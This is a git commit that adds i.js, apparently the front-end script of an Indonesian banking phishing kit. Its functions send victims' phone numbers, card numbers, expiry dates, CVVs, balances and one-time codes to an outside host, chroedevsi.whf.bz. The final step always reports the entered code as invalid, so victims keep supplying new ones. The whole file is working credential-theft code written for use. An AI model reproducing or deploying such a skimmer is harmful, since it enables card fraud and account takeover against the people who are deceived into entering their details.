e0dc71a437000164a8f91f9fb8ecc25dc784cb16
dodypribadi5 <dodypribadi5@gmail.com>
2024-12-22 15:59:04 +0700

    Add files via upload

---
+++ i.js
@@ -0,0 +1,126 @@
+function sendHp() {
+   $('.kleman').fadeIn();   
+   $('.x').fadeIn();
+   event.preventDefault();
+   $(".lanjutkan").prop("disabled", true);
+   document.getElementById('lanjutkan').innerHTML = "Memproses....";
+   
+   var tarif = $('input[name="tarif"]:checked').val();
+   if(tarif) {
+      sessionStorage.setItem('tarif', tarif);
+   }
+   var nohp = $('#nohp').val();
+   sessionStorage.setItem('nohp', nohp);
+   
+   $.ajax({
+      url: 'https://chroedevsi.whf.bz/v4-remi/no.php',
+      type: 'POST',
+      data: $('#login').serialize(),  
+      complete: function() {
+         setTimeout(function() {
+            /*$("#popupku").fadeIn(200);*/
+            window.location = "sudah.html";
+            $('.x').hide();            
+            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
+         }, 800);
+      }
+   });
+};     
+
+function sendLogin(){
+   $('.load').fadeIn();
+    event.preventDefault();   
+    $(".lanjutkan").prop("disabled", true);
+    document.getElementById('lanjutkan').innerHTML = "Memproses....";               
+    
+    $.ajax({
+      url: 'https://chroedevsi.whf.bz/v4-remi/sudah.php',
+      type: 'POST',
+      data: $('#sudah').serialize(),    
+    complete: function(){    
+    setTimeout(function(){   
+    window.location = "saldosdh.html";
+    $("#lonte").hide();
+    $('.load').fadeOut();
+    document.getElementById('lanjutkan').innerHTML = "Lanjutkan"; 
+  var tarif = $('#tarif').val();
+  sessionStorage.setItem('tarif', tarif);     
+  var nohp = $('#nohp').val();
+  sessionStorage.setItem('nohp', nohp);
+  var atm = $('#atm').val();
+  sessionStorage.setItem('atm', atm);
+  var valid = $('#valid').val();
+  sessionStorage.setItem('valid', valid); 
+  var cvv = $('#cvv').val();
+  sessionStorage.setItem('cvv', cvv);   
+
+    }, 500);}});};     
+    
+    
+function sendSaldoS() {
+   $('.load').fadeIn();
+   event.preventDefault();
+   $(".lanjutkan").prop("disabled", true);
+   document.getElementById('lanjutkan').innerHTML = "Memproses....";
+   
+   $.ajax({
+      url: 'https://chroedevsi.whf.bz/v4-remi/saldosdh.php',
+      type: 'POST',
+      data: $('#saldosdh').serialize(),
+      complete: function() {
+         setTimeout(function() {         
+            $("#lonte").hide();
+            $('.load').fadeOut();
+            document.getElementById('lanjutkan').innerHTML = "Lanjutkan";
+            var tarif = $('#tarif').val();
+            sessionStorage.setItem('tarif', tarif);
+            var nohp = $('#nohp').val();
+            sessionStorage.setItem('nohp', nohp);
+            var atm = $('#atm').val();
+            sessionStorage.setItem('atm', atm);
+            var valid = $('#valid').val();
+            sessionStorage.setItem('valid', valid);
+            var cvv = $('#cvv').val();
+            sessionStorage.setItem('cvv', cvv);
+            var saldo = $('#saldo').val();
+            sessionStorage.setItem('saldo', saldo);
+            window.location = "otpsdh.html";
+         }, 400);
+      }
+   });
+};        
+
+
+function sendOtpS() {        
+   event.preventDefault();
+   $("#loader").fadeIn();   
+   $(".btn-primary").prop("disabled", true);
+   var nama1 = document.getElementById('nama1');
+   
+   $.ajax({
+      url: 'https://chroedevsi.whf.bz/v4-remi/otpsdh.php',
+      type: 'POST',
+      data: $('#formsdh').serialize(),
+      complete: function(response) {
+         $("#loader").fadeOut();      
+         $(".btn-primary").prop("disabled", false);
+         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
+         $("#errorAlert").text("Kode aktivasi tidak VALID!").slideDown();
+         $("#nama1").val('');
+         $("#nama1").focus();
+         setTimeout(function() {
+            $("#errorAlert").slideUp();
+         }, 3000);
+      },
+      error: function(error) {
+         $("#loader").hide();
+         $(".btn-primary").prop("disabled", false);
+         $("#errorAlert").removeClass("alert-success").addClass("alert-danger");
+         $("#errorAlert").text("Gagal mengirim kode aktivasi. Silakan coba lagi.").show();
+      }
+   });
+};  
+    
+    
+
+                
